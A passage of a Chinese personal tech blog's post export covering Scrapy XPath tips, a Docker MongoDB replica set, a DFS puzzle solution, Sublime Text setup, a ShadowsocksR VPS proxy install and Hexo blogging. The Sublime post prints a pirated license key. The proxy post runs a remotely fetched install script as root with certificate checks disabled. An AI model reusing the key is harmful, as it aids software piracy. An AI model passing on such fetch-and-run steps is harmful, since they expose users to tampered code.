"image")]/text()').re(r'Name:\s*(.*)')response.xpath('//a[contains(@href, "image")]/text()').re_first(r'Name:\s*(.*)') EXSLT 扩展的使用:123456789101112# re（test()函数）:from scrapy import Selectordoc = """&lt;div&gt;&lt;ul&gt;&lt;li class="item-0"&gt;&lt;a href="link1.html"&gt;first item&lt;/a&gt;&lt;/li&gt;&lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt;&lt;li class="item-inactive"&gt;&lt;a href="link3.html"&gt;third item&lt;/a&gt; &lt;/li&gt;&lt;li class="item-1"&gt;&lt;a href="link4.html"&gt;fourth item&lt;/a&gt;&lt;/li&gt;&lt;li class="item-0"&gt;&lt;a href="link5.html"&gt;fifth item&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;"""sel = Selector(text=doc, type="html")sel.xpath('//li//@href').extract()sel.xpath('//li[re:test(@class, "item-\d$")]//@href').extract() 当需要使用元素的text内容作为一个参数传给一个xpath的string function(比如contains、start_with)时,避免使用.//text()，应该使用.代替。这是因为表达式// text（）产生了一组文本元素 - 一个节点集合。当一个节点集合被转换成一个字符串，当它被作为参数传递给一个像contains（）或starts-with（）这样的字符串函数时，就会产生第一个元素的文本。:1234567891011from scrapy import Selectorsel = Selector(text='&lt;a href="#"&gt;Click here to go to the &lt;strong&gt;Next Page&lt;/strong&gt;&lt;/ a&gt;')sel.xpath('//a//text()').extract()==&gt; # take a peek at the node-set[u'Click here to g o to the ', u'Next Page']sel.xpath("string(//a[1]//text())").extract()==&gt; # convert it to string[u'Clic k here to go to the ']sel.xpath("//a[contains(.//text(), 'Next Page')]").extract()==&gt;[]sel.xpath("//a[contains(., 'Next Page')]").extract()==&gt;[u'&lt;a href="#"&gt;Click here to g o to the &lt;strong&gt;Next Page&lt;/strong&gt;&lt;/a&gt;'] 当使用clss属性查询时，且class有多个属性时，考虑使用css而不是xpath，因为如果你使用@ class=’someclass’，你最终可能会丢失具有其他类的元素，如果你只是使用contains（@class，’someclass’）来弥补，你可能会得到更多的元素，如果他们有一个不同的类名称共享字符串someclass。 事实证明，Scrapy选择器允许你链接选择器，所以大多数情况下，你可以通过CSS来选择类，然后在需要时切换到XPath：12345from scrapy import Selectorsel = Selector(text='&lt;div class="hero shout"&gt;&lt;time datetime="2014-07-23 19:00"&gt;Specia l date&lt;/time&gt;&lt;/div&gt;')sel.css('.shout').xpath('./time/@datetime').extract()]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用docker搭建mongodb副本集]]></title>
    <url>%2F%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86.html</url>
    <content type="text"><![CDATA[当你觉得很累的时候，说明你正在走上坡路。 使用docker搭建mongodb副本集我所使用的环境123docker version: 17.10.0-ce, build f4ffd25docker-compose: version 1.16.1, build 6d1ac219mongo version: 3.6 基本思路与副本集工作流程基本思路 图片解析看这里 副本集工作流程123456789101112131415161718192021222324252627282930313233343536'在 MongoDB 副本集中,主节点负责处理客户端的读写请求,备份节点则负责映射主节点的 数据。备份节点的工作原理过程可以大致描述为,备份节点定期轮询主节点上的数据操作,然后对 自己的数据副本进行这些操作,从而保证跟主节点的数据同步。至于主节点上的所有 数据库状态改变 的操作,都会存放在一张特定的系统表中。备份节点则是根据这些数据进行自己的数据更新。 oplog上面提到的数据库状态改变的操作,称为 oplog(operation log,主节点操作记录)。oplog 存储在 local 数据库的"oplog.rs"表中。副本集中备份节点异步的从主节点同步 oplog,然后重新 执行它记录的操作,以此达到了数据同步的作用。关于 oplog 有几个注意的地方:1）oplog 只记录改变数据库状态的操作2）存储在 oplog 中的操作并不是和主节点执行的操作完全一样,例如"$inc"操作就会转化为"$set"操作3）oplog 存储在固定集合中(capped collection),当 oplog 的数量超过 oplogSize,新的操作就会覆盖就的操作 数据同步在副本集中,有两种数据同步方式:1）initial sync(初始化):这个过程发生在当副本集中创建一个新的数据库或其中某个节点刚从宕机中恢复,或者向副本集中添加新的成员的时候,默认的,副本集中的节点会从离 它最近 的节点复制 oplog 来同步数据,这个最近的节点可以是 primary 也可以是拥有最新 oplog 副本的 secondary 节点。该操作一般会重新初始化备份节点,开销较大。2）replication(复制):在初始化后这个操作会一直持续的进行着,以保持各个 secondary 节点之间的数据同步。 initial sync当遇到无法同步的问题时,只能使用以下两种方式进行 initial sync 了1）第一种方式就是停止该节点,然后删除目录中的文件,重新启动该节点。这样,这个节 点就会执行 initial sync 注意:通过这种方式,sync 的时间是根据数据量大小的,如果数据量过大,sync 时间就 会很长 同时会有很多网络传输,可能会影响其他节点的工作2）第二种方式,停止该节点,然后删除目录中的文件,找一个比较新的节点,然后把该节点目 录中的文件拷贝到要 sync 的节点目录中通过上面两种方式中的一种,都可以重新恢复"port=33333"的节点。不在进行截图了。 副本集管理1）查看oplog的信息 通过"db.printReplicationInfo()"命令可以查看 oplog 的信息 字段说明: configured oplog size: oplog 文件大小 log length start to end: oplog 日志的启用时间段 oplog first event time: 第一个事务日志的产生时间 oplog last event time: 最后一个事务日志的产生时间 now: 现在的时间 2）查看 slave 状态 通过"db.printSlaveReplicationInfo()"可以查看 slave 的同步状态 当插入一条新的数据,然后重新检查 slave 状态时,就会发现 sync 时间更新了' 拉取镜像1docker pull mongo:latest(可以选择需要的版本) 这里直接拉取的官方的镜像，你也可以使用其他镜像 设置network12docker network create my-mongo-clusterdocker network ls 这是一个自建的网络，docker1.9之后的版本可以手动创建网络，详情参考命令docker network create，我这里使用自定义的网络，主要的目的是让容器可以通过container_name互联，也就是在这种网络模式下，hosts是docker帮忙配置解析的，为什么要这么做呢？因为docker container的ip不是固定的，一旦down掉然后重启，ip有可能会发生变化，但是hostname是不会变的。 编写docker-compose.yml123456789101112131415161718192021mongo1: image: mongo:latest container_name: "mongo1" net: "my-mongo-cluster" ports: - "27017:27017" command: mongod --replSet mongoreplsetmongo2: image: mongo:latest container_name: "mongo2" net: "my-mongo-cluster" ports: - "27016:27017" command: mongod --replSet mongoreplsetmongo3: image: mongo:latest container_name: "mongo3" net: "my-mongo-cluster" ports: - "27015:27017" command: mongod --replSet mongoreplset 使用docker-compose -f docker-compose.yml up -d搭建副本集，用docker container ls查看启动的容器 初始化配置使用docker exec -it mongo1 mongo进入mongo1容器的mongo命令模式，执行以下命令:12config = &#123;"_id" : "mongoreplset","members" : [&#123;"_id" : 0,"host" : "mongo1:27017"&#125;,&#123;"_id" : 1,"host" : "mongo2:27017"&#125;,&#123;"_id" : 2,"host" : "mongo3:27017"&#125;]&#125;rs.initiate(config) 然后可以使用rs.status查看副本集状态 验证同步 使用docker exec -it mongo1 mongo进入mongo1的mongo命令行，新建数据库test，并向集合people插入几条记录： 进入m2容器，执行mongo进入mongodb的控制台，查看test数据库的记录，返回错误。mongodb默认读写都是在Primary上进行的，副本节点不允许读写，可以使用如下命令来允许副本读： 1db.getMongo().setSlaveOk() 在m2上也执行命令db.getMongo().setSlaveOk()，使得m2也能读数据； 验证故障转移副本集模式下，如果Primary不可用，整个集群将会选举出新的Primary来继续对外提供读写服务，一起来验证一下m0不可用的时候的状况： 打开一个终端执行docker stop m1停掉m1容器； 执行 docker exec -it mongo2 mongo，再执行rs.status: 可以看到mongo1已经不可达了，mongo3被选为primary 重新启动mongo1，docker start mongo1，进入mongo1的mongo,执行rs.status() 可以看到monogo1重新连入了副本集，但是是作为secondry，primary任然是mongo3 验证登录配置(后序再补充)在python中的使用123456789101112131415161718192021222324252627#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-03-31 16:26:23# @Author : longofo# @Email : |# @Link : http://longofo.ccfrom pymongo import MongoClient, ReadPreferenceclient = MongoClient('mongodb://host1:port1,host2:port2,host3:port3', replicaSet='mongoreplset', readPreference='secondary')'''使用3个ip是为了避免primary挂掉时程序无法连接到数据库。也利用到了mongodb副本集的故障转移功能replicaSet指定副本集名称readPreference有以下几种选项:- primary- primaryPreferred- secondary- secondaryPreferred- nearest默认primary'''db = client['test']for item in db['people'].find(): print(item) 注:代码中的ip:port填自己的 参考 http://www.cnblogs.com/zhoujinyi/p/4635444.html http://www.cnblogs.com/kevingrace/p/5685486.html http://www.kivixv.com/2016/08/15/docker/%E5%9F%BA%E4%BA%8Edocker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86/ https://blog.csdn.net/boling_cavalry/article/details/78173636 pymongo操作副本集]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[剪格子 简单的DFS]]></title>
    <url>%2F%E5%89%AA%E6%A0%BC%E5%AD%90%20%E7%AE%80%E5%8D%95%E7%9A%84DFS.html</url>
    <content type="text"><![CDATA[读万卷书，行万里路 123456789如下图所示，3 x 3 的格子中填写了一些整数。 +--*--+--+ |10* 1|52| +--****--+ |20|30* 1| *******--+ | 1| 2| 3| +--+--+--+我们沿着图中的星号线剪开，得到两个部分，每个部分的数字和都是60...... 问题描述123456789101112131415161718192021222324252627282930313233343536373839如下图所示，3 x 3 的格子中填写了一些整数。 +--*--+--+ |10* 1|52| +--****--+ |20|30* 1| *******--+ | 1| 2| 3| +--+--+--+我们沿着图中的星号线剪开，得到两个部分，每个部分的数字和都是60。本题的要求就是请你编程判定：对给定的m x n 的格子中的整数，是否可以分割为两个部分，使得这两个区域的数字和相等。如果存在多种解答，请输出包含左上角格子的那个区域包含的格子的最小数目。如果无法分割，则输出 0。输入格式程序先读入两个整数 m n 用空格分割 (m,n&lt;10)。表示表格的宽度和高度。接下来是n行，每行m个正整数，用空格分开。每个整数不大于10000。输出格式输出一个整数，表示在所有解中，包含左上角的分割区可能包含的最小的格子数目。样例输入13 3 10 1 52 20 30 1 1 2 3样例输出13样例输入24 3 1 1 1 1 1 30 80 2 1 1 1 100样例输出210注意这个题先输入的是列，然后是行 python版代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-03-31 10:20:40# @Author : longofo# @Email : # @Link : http://longofo.ccclass CutLatticeProblem: ''' 格子剪切问题 ''' def __init__(self, row, col, map_lst): self.row = row # 行 self.col = col # 列 self.map_lst = map_lst # 格子列表 self.dirc = [(1, 0), (-1, 0), (0, -1), (0, 1)] # 方向:上下左右 self.visited = [[False] * col for _ in range(row)] # 初始化标志列表 self.sum = sum([sum(item) for item in map_lst]) # 计算矩阵总和 self.min_count = float('inf') # 定义一个无穷大的数 def judge(self, x, y): ''' 判断坐标是否超出格子列表 ''' if x &lt; 0 or x &gt;= self.row or y &lt; 0 or y &gt;= self.col: return False return True def dfs(self, posx, posy, add, count): ''' 采用深度优先遍历 ''' if add == self.sum / 2: # 这里min_count的值就是左上角围成的数字的数目，因为一开始就是从左上角开始的 if count &lt; self.min_count: self.min_count = count return for dic in self.dirc: next_x, next_y = posx + dic[0], posy + dic[1] if not self.judge(next_x, next_y): continue # 如果没有访问并且当前经过路径的总和小于等于总和的一半，继续遍历下去 if not self.visited[next_x][next_y] and (add + self.map_lst[next_x][next_y]) &lt;= self.sum / 2: self.visited[next_x][next_y] = True #标记访问 self.dfs(next_x, next_y, add + self.map_lst[next_x][next_y], count + 1) self.visited[next_x][next_y] = False #回溯 def main(self): # 如果总和为奇数，那么一定找不到合理的方案 if self.sum % 2 == 1: print(0) self.dfs(0, 0, self.map_lst[0][0], 1) if self.min_count == float('inf'): print(0) else: print(self.min_count)if __name__ == '__main__': col = int(input('input col:')) row = int(input('input row:')) map_lst = [[0] * col for _ in range(row)] print('input a &#123;0&#125; row &#123;1&#125; col 矩阵:'.format(row, col)) for x in range(row): cols = input().split(' ') for y in range(col): map_lst[x][y] = int(cols[y]) cut_lattice = CutLatticeProblem(row, col, map_lst) cut_lattice.main() c++版代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;cstdio&gt; #include &lt;queue&gt; #include &lt;algorithm&gt; #include &lt;climits&gt; #include &lt;cstring&gt; using namespace std ; int ans = INT_MAX ; //定义整型最大值const int dir[4][2] = &#123;&#123;1,0&#125;,&#123;-1,0&#125;,&#123;0,-1&#125;,&#123;0,1&#125;&#125;;//方向int map[15][15] , sum = 0;//保存格子bool visited[15][15] ;//标志访问int row,col ;//行列bool judge(int x , int y) &#123; //判断是否越界 if(x&lt;0||y&lt;0||x&gt;=row||y&gt;=col) &#123; return false ; &#125; return true ; &#125; void DFS(int x , int y , int add , int count) &#123; //深度优先遍历 if(add == sum/2) &#123; if(count&lt;ans) &#123; //这里count就是左上角区域的数目,因为一开始就是从左上角开始的 ans = count ; &#125; return ; &#125; for(int i = 0 ; i &lt; 4 ; ++i) &#123; int nextX = x + dir[i][0] , nextY = y + dir[i][1] ; if(!judge(nextX,nextY)) &#123; continue ; &#125; if(!visited[nextX][nextY]&amp;&amp;add+map[nextX][nextY]&lt;=sum/2)//没有访问过并且和小于等于总和的一般 &#123; visited[nextX][nextY] = true ; //标志访问过 DFS(nextX,nextY,add+map[nextX][nextY],count+1) ; visited[nextX][nextY] = false ; //回溯 &#125; &#125; &#125; int main() &#123; while(scanf("%d%d",&amp;col,&amp;row) != EOF) &#123; sum = 0 ; //注意是先输入的列，在输入的行 for(int i = 0 ; i &lt; row ; ++i) &#123; for(int j = 0 ; j &lt; col ; ++j) &#123; scanf("%d",&amp;map[i][j]) ; sum += map[i][j] ; &#125; &#125; if(sum%2 == 1) &#123; //和为奇数一定没结果的 printf("0\n") ; continue ; &#125; memset(visited,false,sizeof(visited)) ; //初始化 ans = INT_MAX ; DFS(0,0,map[0][0],1) ; if(ans == INT_MAX) printf("0\n") ; else printf("%d\n",ans) ; &#125; return 0 ; &#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>算法</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sublime搭建简易python环境]]></title>
    <url>%2Fsublime%E6%90%AD%E5%BB%BA%E7%AE%80%E6%98%93python%E7%8E%AF%E5%A2%83.html</url>
    <content type="text"><![CDATA[选一个方向，定一个时间，剩下的只管努力与坚持 下载正式版（3143）：下载地址：https://www.sublimetext.com/3 Dev Builds（3156）：下载地址：https://www.sublimetext.com/3dev 插件地址：https://packagecontrol.io/ 12345678910111213----- BEGIN LICENSE -----eldonSingle User LicenseEA7E-1122628C0360740 20724B8A 30420C09 6D7E046F3F5D5FBB 17EF95DA 2BA7BB27 CCB1494727A316BE 8BCF4BC0 252FB8FF FD97DF71B11A1DA9 F7119CA0 31984BB9 7D71700C2C728BF8 B952E5F5 B941FF64 6D7979DAB8EB32F8 8D415F8E F16FE657 A35381CC290E2905 96E81236 63D2B06D E5F01A6984174B79 7C467714 641A9013 94CA7162------ END LICENSE ------ 注：大家请支持正版,注册码来自于网络仅用户学习交流,非法使用与本人无关,侵权联系本人删除! 插件安装Package Control首先看下Preferences下面有没有Package Control这个选项，如果有，直接点击安装。没有，按 Ctrl+` 调出 console ，粘贴以下代码到底部命令行并回车：1import urllib.request,os,hashlib; h = '6f4c264a24d933ce70df5dedcf1dcaee' + 'ebe013ee18cced0ef93d5f746d80ef60'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); print('Error validating download (got %s instead of %s), please try manual install' % (dh, h)) if dh != h else open(os.path.join( ipp, pf), 'wb' ).write(by) 重启 Sublime Text 3。如果在 Perferences-&gt;package settings 中看到 package control 这一项，则安装成功。按下 Ctrl+Shift+P 调出命令面板输入 install 调出 Install Package 选项并回车，然后在列表中选中要安装的插件。 AnacondaAnaconda 是一个终极 Python 插件。它为 ST3 增添了多项 IDE 类似的功能，例如： Autocompletion 自动完成，该选项默认开启，同时提供多种配置选项。 Code linting 使用支持 pep8 标准的 PyLint 或者 PyFlakes。 McCabe code complexity checker 让你可以在特定的文件中使用 McCabe complexity checker. Goto Definitions 能够在你的整个工程中查找并且显示任意一个变量，函数，或者类的定义。 Find Usage 能够快速的查找某个变量，函数或者类在某个特定文件中的什么地方被使用了。 Show Documentation： 能够显示一个函数或者类的说明性字符串(当然，是在定义了字符串的情况下) 使用快捷键ctrl+shift+p调出控制面板，选中package control: install package，等待一会出现另一个控制面板，输入anaconda回车进行安装 但是，刚安装完之后，打开一个 python 文档，所有代码都会被白色细线框中，如图所示； 强迫症的我看着好难受，决心要搞一搞这东西。后来发现在 Sublime &gt; Preferences &gt; Package Settings &gt; Anaconda &gt; Settings – Default 下修改 linting behaviour 选项即可，我这里改成了只有在保存的时候linting工作。 12345678/* Sets the linting behaviour for anaconda: "always" - Linting works always even while you are writing (in the background) "load-save" - Linting works in file load and save only "save-only" - Linting works in file save only*/"anaconda_linting_behaviour": "save-only", SublimeTmpl快速生成文件模板，SublimeTmpl能新建html、css、javascript、php、python、ruby六种类型的文件模板，所有的文件模板都在插件目录的templates文件夹里，可以自定义编辑文件模板。 使用快捷键ctrl+shift+p调出控制面板，选中package control: install package，等待一会出现另一个控制面板，输入SublimeTmpl回车进行安装 SublimeTmpl默认的快捷键:123456ctrl+alt+h htmlctrl+alt+j javascriptctrl+alt+c cssctrl+alt+p phpctrl+alt+r rubyctrl+alt+shift+p python 这里我想修改一下python模板，可以到Data\Packages\SublimeTmpl\templates目录下修改python模板:123456#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : $&#123;date&#125;# @Author : $&#123;author&#125;# @Email : $&#123;email&#125;# @Link : $&#123;link&#125; 然后进行如下操作：Sublime &gt; Preferences &gt; Package Settings &gt; SublimeTmpl &gt; Settings – User 添加如下代码。然后 ctrl+alt+shift+p来新建一个模板试试看：123456789&#123; "disable_keymap_actions": false, // "all"; "html,css" "date_format" : "%Y-%m-%d %H:%M:%S", "attr": &#123; "author": "", "email": "", "link": "http://longofo.cc", &#125; &#125; SublimeREPL使用快捷键ctrl+shift+p调出控制面板，选中package control: install package，等待一会出现另一个控制面板，输入SublimeREPL回车进行安装 键位绑定在Preferences-&gt;Key Bindings-User，复制一下代码：1234567891011[ &#123; "keys":["f1"], "caption": "SublimeREPL: Python", "command": "run_existing_window_command", "args": &#123; "id": "repl_python", "file": "config/Python/Main.sublime-menu" &#125; &#125;] 然后就可以通过f1来快速打开python解释器界面 效果： 常用快捷键 跳转 到任意内容：ctrl+p 用来快速查找和打开文件。你仅仅只需要工程中文件的一部分路径或者文件名你就可以很容易的打开这个文件。这在一个大型的 Django 工程中显得非常方便。 跳转到指定行：ctrl+g让你在当前文件中跳转到指定行数。 跳转到标志 ：cmd+r 可以列出当前文件中所有的函数或者类，让你更方便查找。你可以通过输入关键字来查找你所需要的函数或者类。 跳转到行首：ctrl+left-arrow-key 与 跳转到行尾 cmd+right-arrow-key 删除当前行：ctrl+shift+k 多重编辑：选定一个单词，点击 cmd+d来选择同样的单词，再次点击 cmd+d继续选择下一个单词…或者 cmd+单击来指定多个你想要同时修改的地方。 查找：ctrl+f，普通的字符串查找就不用说了，这里说下正则查找，如下图，将.*位置选上: 替换： ctrl+h，不同字符串替换很简单，同样这里只说正则替换，如下图: 替换前： 替换后： python版本切换tools-&gt;build system-&gt;new build system，分别创建Python27.sublime-build: 1234567891011&#123;"cmd": ["C:/Python27/python.exe","-u","$file"],"file_regex": "^[ ]*File \"(...*?)\", line ([0-9]*)","selector": "source.python","encoding": "utf-8","env": &#123;"PYTHONIOENCODING": "utf-8"&#125;,&#125; 和Python36.sublime-build： 1234567891011&#123;"cmd": ["C:/Python36/python.exe","-u","$file"],"file_regex": "^[ ]*File \"(...*?)\", line ([0-9]*)","selector": "source.python","encoding": "utf-8","env": &#123;"PYTHONIOENCODING": "utf-8"&#125;,&#125; 注:代码中cmd里面的路径为你自己的python路径 参考链接http://blog.csdn.net/u011475210/article/details/78168341https://www.jianshu.com/p/a401a0bfddf7http://blog.csdn.net/wooder111/article/details/78749614]]></content>
      <categories>
        <category>搭建</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>搭建</tag>
        <tag>sublime</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科学上网-ShadowsocksR+vps]]></title>
    <url>%2F%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91-ShadowsocksR-vps.html</url>
    <content type="text"><![CDATA[这世界的大多数事情，不是稍微努力就可以搞定 前言常见的科学上网的方式 Shadowsocks(R) VPN Lantern 目前而言，Lantern因为其一键启动的特性，所以小白用户使用不在少数，但主要用于Google和twitter等。 然而当对科学上网的使用有高带宽需求（如看高清的youtube、PH）的时候，Lantern就显得力不从心了。 VPN的使用也较为简单，并且是早起科学上网的主要方式，因此是ZF重点的打击对象。 VPN由于其端口基本固定，且流量特征易被检测封堵，现在已经越来越少有用户使用其进行科学上网。 Shadowsocks（简称SS）的出现以后，它端口任意，流量无明显特征的优点使得其迅速成为科学上网人士的首选。 不过，ShadowsocksR（简称SSR）则更进一步，将流量伪装成http等“常规的”网络流量，进一步加大了检测封堵的难度。 关于科学上网的方式及原理的更多介绍，请参考文章几种常见的科学上网方式或手动必应（假设你还没Google，也别用百度） 进行不可描述操作的基本要求 英语水平过得去 有信用卡（当然现在也有部分海外VPS服务商支持支付宝了） 有基本的Linux使用经验（没有也行，遇到错误就Search就行） 客户端下载电脑版： Download Now安卓版： Download Now 注: 后面购买VPS需要翻墙，如果你还不能翻墙，可以下载Lantern Download Now 购买VPS搭建专属SS服务的第一步，是购买海外的VPS（Virtual Private Server）。 VPS服务商选择现有使用较多的VPS服务商有数十家。 海外知名的有BandWagonHost、Linode、Vultr、DigitalOcean等。国内VPS服务商在海外有节点的有阿里云、腾讯云等。（博主使用的是BandWagonHost） 更多服务商列表请参考VPSer 购买步骤（以BandWagonHost为例）首先去搬瓦工注册 Step1、点击VPS Hosting，根据需要选择配置（建议选择KVM） Step2、选择节点(最好选择US Log) 获取优惠码(新用户应该有)填入优惠码 购买(支持支付宝付费) 系统自己选择(我使用的centos) 安装部署shadowsocksRroot用户登录，运行以下命令：12345wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocksR.shchmod +x shadowsocksR.sh./shadowsocksR.sh 2&gt;&amp;1 | tee shadowsocksR.log 安装过程中根据提示输入信息安装完成后提示如下：12345678910111213Congratulations, ShadowsocksR install completed!Server IP:your_server_ipServer Port:your_server_portPassword:your_passwordLocal IP:127.0.0.1Local Port:1080Protocol:originobfs:plainEncryption Method:aes-256-cfbWelcome to visit:https://shadowsocks.be/9.htmlIf you want to change protocol &amp; obfs, reference URL:https://github.com/breakwa11/shadowsocks-rss/wiki/Server-SetupEnjoy it! 以上信息会在客户端配置中用到 卸载方法：使用 root 用户登录，运行以下命令：1./shadowsocksR.sh uninstall 安装完成后即已后台启动 ShadowsocksR ，运行：1/etc/init.d/shadowsocks status 可以查看 ShadowsocksR 进程是否已经启动。本脚本安装完成后，已将 ShadowsocksR 自动加入开机自启动。 常用命令：1234567启动：/etc/init.d/shadowsocks start停止：/etc/init.d/shadowsocks stop重启：/etc/init.d/shadowsocks restart状态：/etc/init.d/shadowsocks status配置文件路径：/etc/shadowsocks.json日志文件路径：/var/log/shadowsocks.log代码安装目录：/usr/local/shadowsocks 多用户配置 sample：123456789101112131415161718192021&#123;"server":"0.0.0.0","server_ipv6": "[::]","local_address":"127.0.0.1","local_port":1080,"port_password":&#123; "8989":"password1", "8990":"password2"， "8991":"password3"&#125;,"timeout":300,"method":"aes-256-cfb","protocol": "origin","protocol_param": "","obfs": "plain","obfs_param": "","redirect": "","dns_ipv6": false,"fast_open": false,"workers": 1&#125; 加速参考：ShadowsocksR优化加速 shadowsocksR 客户端配置 运行shadowsocksR 客户端，填入你自己服务端配置的信息 右键右下角飞机图标–&gt;系统代理模式你可以直接选择全局模式，这样不用配置浏览器的代理也可以使用其他模式，配置代理端口，浏览器配置代理ip+端口，具体方式请自行搜索]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>科学上网</tag>
        <tag>ShadowsocksR</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo+github搭建博客折腾笔记]]></title>
    <url>%2FHexo%2Bgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0.html</url>
    <content type="text"><![CDATA[写博客，就要用心 &nbsp;&nbsp;&nbsp;&nbsp;看到很多人用hexo+github搭建了自己的博客，自己也很早就想搭建一个个人专属博客,于是搭建了本博客，用于分享一些心得。折腾博客的各种配置以及功能占具了我一部分时间，在此详细记录下我是如何利用hexo+github搭建静态博客以及一些配置相关问题，以免过后遗忘，且当备份之用。 准备工作获得个人网站域名 域名是网站的入口，也是网站的第一印象，比如饿了么的官网的域名是：ele.me/，很是巧妙。常见的有com,cn,net,org等后缀，也有小众的xyz,me,io等后缀，根据你自己的喜好，选择不同的后缀，比如我选择就是常见的com后缀。很多小众奇特的后缀在大陆是没办法备案的，网站也就无法上线。然而使用GitHub托管我们的网站，完全不需要备案，因为托管我们的网站内容的服务器在美国，而且在国内备案流程也比较繁杂，时间需要一周左右。 申请域名的地方有很多，这里推荐阿里云：阿里云-为了无法计算的价值 申请入口：域名注册购买域名这也是我们整个搭建过程中惟一一个需要花钱的地方。如果你已经有了空闲域名就无需购买，直接使用即可。如下图是我购买的域名: GitHub创建个人仓库 登录到GitHub,如果没有GitHub帐号，使用你的邮箱注册GitHub帐号：GitHub 点击GitHub中的New repository创建新仓库，仓库名应该为：用户名.github.io，这个用户名使用你的GitHub帐号名称代替，这是固定写法，比如我的仓库名为： 安装(由于这不是重点，就简单说下，网上很多方法) 安装git 什么是Git ?简单来说Git是开源的分布式版本控制系统，用于敏捷高效地处理项目。我们网站在本地搭建好了，需要使用Git同步到GitHub上。如果想要了解Git的细节，参看廖雪峰老师的Git教程：Git教程 从Git官网下载：Git - Downloading Package 现在的机子基本都是64位的，选择64位的安装包，下载后安装，在命令行里输入git测试是否安装成功，若安装失败，参看其他详细的Git安装教程。安装成功后，将你的Git与GitHub帐号绑定，绑定过程看廖雪峰老师的Git教程 安装Node.js Hexo基于Node.js，Node.js下载地址：Download | Node.js 下载安装包，注意安装Node.js会包含环境变量及npm的安装，安装后，检测Node.js是否安装成功，在命令行中输入 node -v :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 检测npm是否安装成功，在命令行中输入npm -v :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 安装hexo Hexo就是我们的个人博客网站的框架， 这里需要自己在电脑常里创建一个文件夹，可以命名为Blog，Hexo框架与以后你自己发布的网页都在这个文件夹中。创建好后，进入文件夹中:使用npm命令安装Hexo，输入 npm install -g hexo这个安装时间较长耐心等待，安装完成后，初始化我们的博客，输入：hexo init blog注意，这里的命令都是作用在刚刚创建的Blog文件夹中。为了检测我们的网站雏形，分别按顺序输入以下三条命令： 123hexo new test_my_sitehexo ghexo s 这些命令在后面作介绍，完成后，打开浏览器输入地址： localhost:4000可以看出我们写出第一篇博客 推送网站 上面只是在本地预览，接下来要做的就是就是推送网站，也就是发布网站，让我们的网站可以被更多的人访问。在设置之前，需要解释一个概念，在blog根目录里的_config.yml文件称为站点配置文件，如下图:进入根目录里的themes文件夹，里面也有个_config.yml文件，这个称为主题配置文件，如下图:下一步将我们的Hexo与GitHub关联起来，打开站点的配置文件_config.yml，翻到最后修改为：1234deploy: type: git repository: git@github.com:你的用户名/你的用户名.github.io.git branch: master 保存站点配置 运行：npm install hexo-deployer-git –save 运行：hexo g（本地生成静态文件) 运行：hexo d（将本地静态文件推送至Github） 此时，打开浏览器，访问http://longofo.github.io 绑定域名 博客已经搭建好，也能通过github的域名访问，但总归还是用自己的域名比较舒服。因为我们需要设置将自己的域名绑定到github这个博客项目上。 域名提供商设置 添加2条A记录： @—&gt;192.30.252.154 @—&gt;192.30.252.153 添加一条CNAME记录： CNAME—&gt;你的用户名.github.io 如图： 博客添加CNAME文件配置完域名解析后，进入博客目录，在站点source目录下新建CNAME文件，写入域名，如：longofo.cc 运行：hexo g 运行：hexo d 更换主题 如果你不喜欢Hexo默认的主题，可以更换不同的主题，主题传送门：Themes 我自己使用的是Next主题，可以在blog目录中的themes文件夹中查看你自己主题是什么。现在把默认主题更改成Next主题，在blog目录中（就是命令行的位置处于blog目录）打开命令行输入：1git clone https://github.com/iissnan/hexo-theme-next themes/next 这是将Next主题下载到blog目录的themes主题下的next文件夹中。打开主题的_config.yml配置文件，修改主题为next，如图：打开主题的_config.yml配置文件，不是站点主题文件，找到Scheme Settingsnext主题有三个样式，我用的是Mist，你们可以自己试试看，选择你自己喜欢的样式（只需要把行首的#去除，#是注释），选择好后，再次部署网站，hexo g、hexo d，查看效果。选择其他主题，按照上述过程即可实现。 初识MarkDown语法 